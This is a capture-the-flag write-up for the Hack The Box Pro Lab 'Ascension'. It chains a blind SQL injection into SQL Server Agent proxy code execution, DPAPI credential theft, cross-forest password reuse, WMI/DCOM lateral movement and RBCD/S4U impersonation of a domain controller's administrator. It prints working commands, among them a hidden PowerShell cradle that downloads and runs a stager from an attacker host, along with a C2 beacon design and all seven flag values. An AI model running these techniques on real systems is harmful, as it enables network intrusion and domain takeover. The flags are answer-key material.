---
doc_kind: writeup
title: "HTB Pro Lab Ascension - SQLi to SQLAgent RCE to Cross-Forest RBCD (7/7 flags)"
category: misc
slug: htb-ascension-prolab-sqli-rbcd-cross-forest
created: 2026-10-25
status: solved
tags:
  - active-directory
  - pro-lab
  - blind-sqli
  - mssql
  - sqlagent-proxy
  - dpapi
  - cross-forest-trust
  - thycotic-secret-server
  - wmi-dcom
  - rbcd
  - s4u2self
  - s4u2proxy
  - kerberos
source: "HTB Pro Lab - Ascension (Daedalus Airlines x MegaAirlines)"
target: "WEB01 / DC1 (daedalus.local) -> MS01 / DC2 (megaairline.local)"
---
# HTB Pro Lab Ascension - SQLi to SQLAgent RCE to Cross-Forest RBCD (7/7 flags)

## Challenge Summary

- Source: HTB Pro Lab - Ascension (Endgame), two writeups cross-checked (7flags PDF + L&_M@z4rt PDF, same session 18-19 Oct 2026, both 7/7 flags, values match byte-for-byte)
- Target: WEB01 (10.13.38.20, only host reachable from Kali) -> DC1 (daedalus.local, double-NIC gateway) -> MS01 / DC2 (megaairline.local, reachable only via DC1's second NIC)
- Goal: Compromise both AD forests (daedalus.local and megaairline.local, linked by a FOREST_TRANSITIVE trust) and capture all 7 flags

## Initial Signals

- Entry point: WEB01 exposes only port 80 (IIS 10), a flight-booking site (`book-trip.php`, `index.php`, `search.php`) backed by MSSQL 2017; `destination` parameter in `book-trip.php` is blind SQL-injectable (no direct error/data reflection).
- Visible hints: double-NIC hosts (WEB01 itself has two IPs, and DC1 bridges both 192.168.10.0/24 and 192.168.11.0/24) are the structural signal that this is a multi-segment pivot lab, not a single-box challenge.
- First confirming probe: `destination=x' UNION ALL SELECT 1,<expr>,3,4,5-- -` reflected into the page's second column (`<div class="country">`) confirms both the column count and that UNION-based read is viable even though the injection is otherwise blind.

## Exploit Chain

1. **Takeoff (WEB01, blind SQLi to RCE).** The `destination` param supports both `UNION ALL SELECT` reads and **stacked queries** for writes (`destination=x'; <stmt>-- -`). Since the app's own output only surfaces one column, a dedicated exfil table `daedalus.dbo.o` is used as an out-of-band mailbox: scripts `INSERT INTO dbo.o SELECT ...` to stash results, then re-read them via the same UNION — this also captures procedure errors and config values that never make it into the HTTP response. Enumeration (`SUSER_SNAME()`, `sys.server_role_members`, `sys.database_permissions`) reveals two key facts: (a) the web app's SQL login can `EXECUTE AS LOGIN='daedalus_admin'`, and (b) `daedalus_admin` holds `SQLAgentUserRole`/`SQLAgentOperatorRole` — enough to create and run SQL Server Agent jobs without being `sysadmin`. Enumerating `msdb.dbo.sp_help_proxy` finds proxy `proxy_id=1`: job steps run under this proxy execute **not** as `NT SERVICE\SQLSERVERAGENT` but as the proxy's own credential, `WEB01\svc_dev`. Creating a `CmdExec` job step with `@proxy_id=1` that downloads and runs a PowerShell stager gives command execution as `WEB01\svc_dev` — RCE with no direct MSSQL login ever used, and no binary dropped via a memory-corruption bug (a durable technique: the job is persisted in MSDB).
2. **Intercept (WEB01, to SYSTEM + HTTP beacon).** `WEB01\Administrator`'s local password is recovered from harvested secrets. A WinRM loopback call (`Invoke-Command -ComputerName 127.0.0.1 -Credential <local admin>`) registers a SYSTEM-level scheduled task running a persistent PowerShell beacon. The beacon polls `/tools/cmd.ps1` with an anti-cache GUID query param, executes the script body only if it changed since the last poll (hash/diff check), and returns command output **hex-encoded inside the URL path** in 1000-character chunks (`GET /tools/o/<n>/<hex>`, terminated by `GET /tools/o/999/end`). Each command response carries a unique nonce suffix to correlate replies with the command that produced them.
3. **Contrails & Wingman (DC1, DPAPI secrets to WinRM).** From administered WEB01, DPAPI master-key/credential-vault analysis recovers `DAEDALUS\administrator`'s cleartext password. DC1 is reachable from WEB01 because DC1 is itself double-NIC'd onto 192.168.11.0/24. `Invoke-Command -ComputerName <DC1> -Credential <DA> -Authentication Negotiate` with a **byte-exact read** (`[IO.File]::ReadAllBytes` + `[BitConverter]::ToString`, never `Get-Content`, to avoid any whitespace/casing normalization of the flag) reads two flags from two different DC1 profiles — `svc_backup.DAEDALUS` (the account whose `CanPSRemote` right on DC1 is the lab's "intended" path) and `Administrator`.
4. **Corridor & Upgrade (MS01, cross-forest cred reuse to WMI/DCOM RCE).** From DC1's second NIC, host discovery plus `Get-ADTrust -Filter *` confirms `megaairline.local` is `FOREST_TRANSITIVE`. A daedalus.local account (`elliot`) turns out to share the **same password** in megaairline.local (cross-forest credential reuse) and authenticates to a **Thycotic Secret Server 10.9** instance on MS01. Thycotic's `/SecretServer/AdminScripts.aspx` "remote scripts" feature allows injecting shell metacharacters into a script definition (`foo || type c:\users\elliot\desktop\flag.txt || bar`), giving command execution in the web service's context and reading one flag directly. MS01's port 445 (SMB) is **filtered** — no `C$`, no PsExec, no `schtasks /s` — but port 135 (RPC) is open, so **WMI over DCOM** (`New-CimSession -Protocol Dcom` + `Invoke-CimMethod ... Win32_Process Create`) gives arbitrary command execution on MS01 from DC1 despite the SMB block. Output is exfiltrated by writing it into MS01's own IIS webroot (`C:\inetpub\wwwroot\z_*.txt`) and re-reading it over plain HTTP from DC1 (with `$wc.Proxy = $null`, since a WinRM session's `WebClient` otherwise inherits a proxy that breaks the request).
5. **Maverick (DC2, RBCD + S4U to the second forest's DC).** `MEGAAIRLINE\anna`'s interactive logon is blocked (error 2240, "not allowed to log on from this workstation") but this only blocks *interactive* logon — a **Kerberos TGT request still succeeds** (`Rubeus.exe asktgt`). The forest's `ms-DS-MachineAccountQuota=10` allows any authenticated user to create machine accounts (Powermad `New-MachineAccount`), yielding a machine account under full attacker control. Writing that machine account's SID into DC2's own `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute (direct `[ADSI]` LDAP write, by hostname — an IP-based LDAP bind degrades to NTLM and can fail across a WinRM double-hop) sets up **Resource-Based Constrained Delegation (RBCD)** against the domain controller itself. `Rubeus.exe s4u` (S4U2Self + S4U2Proxy, using the machine account's RC4/NTLM hash — **not** its plaintext password, which the S4U step rejects) then mints a `CIFS/DC2` service ticket impersonating `administrator`, giving `\\DC2\C$` read access and the final flag.

## Key Evidence

- `msdb.dbo.sp_help_proxy` showing `proxy_id=1` bound to a real OS credential — the single detail that turns a SQLAgent job from a useless `NT SERVICE\SQLSERVERAGENT` ping into real RCE as a named service account.
- `[BitConverter]::ToString(bytes)` reads for every flag — the lab explicitly rejected a flag value that had been "reconstructed from the theme" instead of read byte-for-byte, proving normalization (even just `Get-Content`'s line-ending/encoding handling) can corrupt a flag silently.
- `Get-ADTrust -Filter *` returning `FOREST_TRANSITIVE` is the structural proof that a cross-forest credential-reuse or delegation attack is in scope at all, before spending time looking for one.
- Error 2240 on `anna`'s logon attempt does **not** mean the account is unusable — Kerberos TGT issuance is a separate authorization check from interactive-logon rights, and RBCD/S4U only needs the former.

## Dead Ends

- Naming a PowerShell helper function `H` collided with the built-in alias `h` → `Get-History`, causing a cryptic "Cannot bind parameter 'Id'" (PowerShell tried to convert a file path argument to `Int64`). Always use unambiguous, prefixed function names in a long operator session.
- A dropped VPN tunnel (`tun0` disappearing) looked exactly like a dead C2 beacon (ping still responded, everything else timed out) — wasted time was spent suspecting the payload before checking `ip -br a` / routing / the local HTTP listener first.
- `Rubeus.exe s4u` requires a hash (`/rc4` or `/aes256`) for the S4U2Self step, **not** `/password` — passing the machine account's plaintext password at that stage fails.
- `New-MachineAccount` binding by IP address instead of FQDN was rejected ("credential invalid") — AD machine-account creation and the subsequent RBCD attribute write must target the DC by resolvable hostname for correct Kerberos SPN/credential handling.

## Payloads And Commands

```sql
-- Takeoff: SQLAgent proxy RCE (daedalus_admin impersonation + proxy_id=1)
USE msdb; EXECUTE AS LOGIN='daedalus_admin';
EXEC msdb.dbo.sp_add_job @job_name=N'hbx1';
EXEC msdb.dbo.sp_add_jobstep
  @job_name=N'hbx1', @step_name=N's1', @subsystem=N'CmdExec',
  @command=N'powershell -nop -w hidden -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker>:8000/s.ps1'')"',
  @proxy_id=1;  -- key: runs as the proxy's OS credential, not SQLSERVERAGENT
EXEC msdb.dbo.sp_add_jobserver @job_name=N'hbx1';
EXEC msdb.dbo.sp_start_job    @job_name=N'hbx1';
REVERT;
```

```powershell
# Corridor/Upgrade: WMI over DCOM when SMB/445 is filtered
$s = New-CimSession -ComputerName <MS01> -Credential $cred `
       -SessionOption (New-CimSessionOption -Protocol Dcom)
Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create `
  -Arguments @{ CommandLine = 'cmd /c type C:\Users\Administrator\Desktop\flag.txt > C:\inetpub\wwwroot\z_adm.txt' }
$wc = New-Object Net.WebClient; $wc.Proxy = $null
[BitConverter]::ToString($wc.DownloadData('http://<MS01>/z_adm.txt')) -replace '-',''
```

```powershell
# Maverick: TGT despite blocked interactive logon, then RBCD + S4U to DC2
Rubeus.exe asktgt /domain:megaairline.local /dc:<DC2> /user:anna /password:<pw> /ptt /nowrap
New-MachineAccount -MachineAccount EvilMachine -Password (ConvertTo-SecureString '...' -AsPlainText -Force) `
  -Domain megaairline.local -DomainController DC2.megaairline.local   # by FQDN, not IP
# ... write msDS-AllowedToActOnBehalfOfOtherIdentity on the DC2 computer object via [ADSI] ...
Rubeus.exe hash /user:'EvilMachine$' /password:'...' /domain:megaairline.local
Rubeus.exe s4u /domain:megaairline.local /dc:<DC2> /user:'EvilMachine$' /rc4:<hash> `
  /impersonateuser:administrator /msdsspn:CIFS/DC2.megaairline.local /altservice:cifs /ptt /nowrap
cmd /c type \\DC2.megaairline.local\C$\Users\Administrator\Desktop\flag.txt
```

## Flag / Outcome

- 7/7 flags, verified byte-for-byte via hex dump against both independent writeups of the same session:
  1. Takeoff (WEB01) — `ASCENSION{y0ur_4gent_is_oUr_aG3n7}`
  2. Intercept (WEB01) — `ASCENSION{N0_c0mm@nd_1s_saf3}`
  3. Contrails (DC1) — `ASCENSION{15nT_dPaP1_s3cuRe?}`
  4. Wingman (DC1) — `ASCENSION{0G_adm1ni5tR@tor}`
  5. Corridor (MS01) — `ASCENSION{n0t_so_s3cR3t_H1sToRy}`
  6. Upgrade (MS01) — `ASCENSION{sL4ck1ng_0n_enCrypt1oN}`
  7. Maverick (DC2) — `ASCENSION{g0t_a1L_7h3_ac3s}`

## Reusable Lessons

- When a blind SQLi response surfaces only one column, build an exfil-table "mailbox" (`INSERT`+`UNION` re-read) rather than fighting a narrow blind-boolean oracle — it recovers procedure errors and config values a plain blind injection would miss.
- Always enumerate SQL Server Agent proxies (`sp_help_proxy`) when `IMPERSONATE`/`EXECUTE AS` gives SQLAgent roles short of `sysadmin` — a job step bound to a proxy runs as that proxy's real OS credential, turning a limited impersonation into full command execution.
- `[BitConverter]::ToString(bytes)` (or any byte-exact read) beats `Get-Content`/`type` for flag/secret extraction whenever the platform validates exact casing/whitespace.
- SMB filtered ≠ a dead end for lateral movement — check for RPC/135 and pivot to WMI over DCOM; exfiltrate through any writable web root the target already serves over HTTP instead of trying to force an SMB tunnel.
- A blocked interactive logon (error 2240) does not block Kerberos TGT issuance — this gap is exactly what RBCD/S4U chains need, and is worth checking even when a service account "can't log on."
- AD attribute writes (RBCD, quotas) and machine-account creation should always target the DC by FQDN, not IP, to avoid NTLM fallback and Kerberos double-hop failures.

## Pattern Candidates

- New pattern created: `knowledge/patterns/misc/ad-cross-forest-sqlagent-rbcd-s4u-chain.md`
